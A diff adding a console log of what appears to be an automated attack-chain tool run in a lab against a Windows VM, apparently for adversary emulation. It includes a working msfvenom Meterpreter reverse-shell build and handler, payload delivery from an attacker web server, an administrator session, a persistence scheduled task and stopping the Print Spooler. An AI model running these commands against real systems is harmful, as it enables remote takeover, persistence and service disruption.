@@ -1,0 +1,242 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260713T163756Z-78114f34/chain-002]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[MSFVenom Console] Step 1
+
+📌[Name] Build the executable file of a Meterpreter session (for Windows) using MSFVenom
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 4444 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.exe' , required: False): 
+
+[MSFVenom] Command to run:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.43 LPORT=4444 -f exe -o /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.exe
+Run this MSFVenom command? [y/n] (y): 
+[MSFVenom] Running... (may take 5-10s)
+✓ MSFVenom payload generated successfully
+
+📌[Metasploit Executor] Step 2
+
+📌[Name] Set an MSF payload handler for a file-backed payload
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: False): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 4444 , required: False): 
+ Parameter Input
+  Parameter: payload_name
+  Description: payload type set by msf
+➤ Enter value for payload_name (current: 'windows/meterpreter/reverse_tcp' , required: False): 
+[*] Executing exploit=exploit/multi/handler payload=windows/meterpreter/reverse_tcp
+[+] Handler active — job 26: Exploit: multi/handler
+✓ Handler active — job 26, awaiting callback
+No active sessions found after 20s.
+
+📌[Human] Step 3
+
+📌[Name] Simulate the victim download and execute malicious payload file
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_mp.exe' , required: True): 
+
+⚠ Human action required:
+╭──────────────────────────────────────────────────── Manual Step ─────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                               │
+│ (On attacker's machine)                                                                                              │
+│ python -m http.server 8000                                                                                           │
+│                                                                                                                      │
+│ (On victim's machine)                                                                                                │
+│ 1. Open 192.168.56.43:8000 in the browser                                                                            │
+│ 2. Navigate to the path of the target payload file                                                                   │
+│ 3. Download the payload file                                                                                         │
+│ 4. Execute the payload file to C:\Users\Public\chain_mp.exe (If on a Linux machine, you also need to chmod the file) │
+│                                                                                                                      │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 4
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [134] meterpreter — WIN-BASE\user @ WIN-BASE (192.168.56.65:49811)
+➤ Session id to accept (default: 134, or 'n' to abort chain): 
+
+📌[Meterpreter Executor] Step 5
+
+📌[Name] ARP Cache Inspection
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[134] WIN-BASE\user @ WIN-BASE
+Select session ID: 134
+Set the default session id as: 134!
+Selected meterpreter session: 134
+
+[Meterpreter Executor] Executing: arp
+Keep going with the next attack step? [y/n] (y): 
+
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    10.0.2.2         52:54:00:12:35:02  Intel(R) PRO/1000 MT Desktop Adapter #2
+    10.0.2.3         52:54:00:12:35:03  Intel(R) PRO/1000 MT Desktop Adapter #2
+    10.0.2.255       ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter #2
+    192.168.56.2     08:00:27:50:64:0c  Intel(R) PRO/1000 MT Desktop Adapter
+    192.168.56.43    08:00:27:b1:ea:51  Intel(R) PRO/1000 MT Desktop Adapter
+    192.168.56.255   ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1
+    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Desktop Adapter #2
+    224.0.0.251      01:00:5e:00:00:fb  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.251      01:00:5e:00:00:fb  Intel(R) PRO/1000 MT Desktop Adapter #2
+    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Desktop Adapter #2
+    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1
+    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) PRO/1000 MT Desktop Adapter #2
+    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter #2
+
+
+
+📌[Human] Step 6
+
+📌[Name] Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin
+ Parameter Input
+  Parameter: EXE_PATH
+  Description: Path of the executable the shortcut points at
+  ✓ Using stored value: C:\Users\Public\chain_mp.exe
+
+⚠ Human action required:
+╭────────────────────────────────────────────────────── Manual Step ───────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                                   │
+│ (On victim's machine, on the desktop or a folder)                                                                        │
+│ Right-click a shortcut (.lnk) whose target is:                                                                           │
+│ C:\Users\Public\chain_mp.exe                                                                                             │
+│ then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click). │
+│                                                                                                                          │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 7
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: ['134']
+  Newly detected session(s):
+    [135] meterpreter — WIN-BASE\Administrator @ WIN-BASE (192.168.56.65:49818)
+➤ Session id to accept (default: 135, or 'n' to abort chain): 
+
+📌[Meterpreter Session Derive] Step 8
+📌[Name] Execute System Command
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[134] WIN-BASE\user @ WIN-BASE
+[135] WIN-BASE\Administrator @ WIN-BASE
+Select session ID: 135
+Set the default session id as: 135!
+Selected meterpreter session: 135
+  ↳ Derived executor_derived executor from Meterpreter session 135
+
+📌[Command Prompt Executor] Step 9
+
+📌[Name] Scheduled task Local
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke schtasks.
+  ✓ Using stored value: 135
+ Parameter Input
+  Parameter: task_name
+  Description: Name of the scheduled task.
+➤ Enter value for task_name (current: 'AuroraChainPersist' , required: True): 
+ Parameter Input
+  Parameter: task_command
+  Description: Command line the task executes at the scheduled time.
+➤ Enter value for task_command (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+ Parameter Input
+  Parameter: task_time
+  Description: HH:MM local time when the task fires.
+➤ Enter value for task_time (current: '23:59' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  SCHTASKS /Create /SC ONCE /TN "AuroraChainPersist" /TR "C:\Windows\System32\notepad.exe" /ST 23:59
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: SCHTASKS /Create /SC ONCE /TN "AuroraChainPersist" /TR "C:\Windows\System32\notepad.exe" /ST 23:59
+Output:
+SUCCESS: The scheduled task "AuroraChainPersist" has successfully been created.
+
+
+📌[Command Prompt Executor] Step 10
+
+📌[Name] Windows - Stop service using net.exe
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke net.
+  ✓ Using stored value: 135
+ Parameter Input
+  Parameter: service_name
+  Description: Name of the Windows service to stop.
+➤ Enter value for service_name (current: 'spooler' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  net.exe stop spooler
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: net.exe stop spooler
+Output:
+The Print Spooler service is stopping.
+The Print Spooler service was stopped successfully.
+
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                                  Start                    End                      Duration  Status
+   1  Build the executable file of a Meterpreter session (for Windows) using MSFVenom       2026-07-17 15:54:33 UTC  2026-07-17 15:54:45 UTC     12.6s    ✓   
+   2  Set an MSF payload handler for a file-backed payload                                  2026-07-17 15:54:45 UTC  2026-07-17 15:55:49 UTC     1m 3s    ✓   
+   3  Simulate the victim download and execute malicious payload file                       2026-07-17 15:55:49 UTC  2026-07-17 15:57:15 UTC    1m 26s    ✓   
+   4  Execute a Meterpreter Payload                                                         2026-07-17 15:57:15 UTC  2026-07-17 15:57:17 UTC      1.7s    ✓   
+   5  ARP Cache Inspection                                                                  2026-07-17 15:57:17 UTC  2026-07-17 15:57:22 UTC      5.6s    ✓   
+   6  Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable  2026-07-17 15:57:22 UTC  2026-07-17 15:58:29 UTC     1m 6s    ✓   
+      as Admin                                                                                                                                                
+   7  Execute a Meterpreter Payload                                                         2026-07-17 15:58:29 UTC  2026-07-17 15:58:32 UTC      2.4s    ✓   
+   8  Execute System Command                                                                2026-07-17 15:58:32 UTC  2026-07-17 15:58:37 UTC      5.1s    ✓   
+   9  Scheduled task Local                                                                  2026-07-17 15:58:37 UTC  2026-07-17 15:58:45 UTC      8.4s    ✓   
+  10  Windows - Stop service using net.exe                                                  2026-07-17 15:58:45 UTC  2026-07-17 15:58:56 UTC     10.6s    ✓   
+
+  Total: 10 steps executed (10 ✓, 0 ?, 0 ✗) in 4m 23s
+══════════════════════════════════════════════════════════════════════
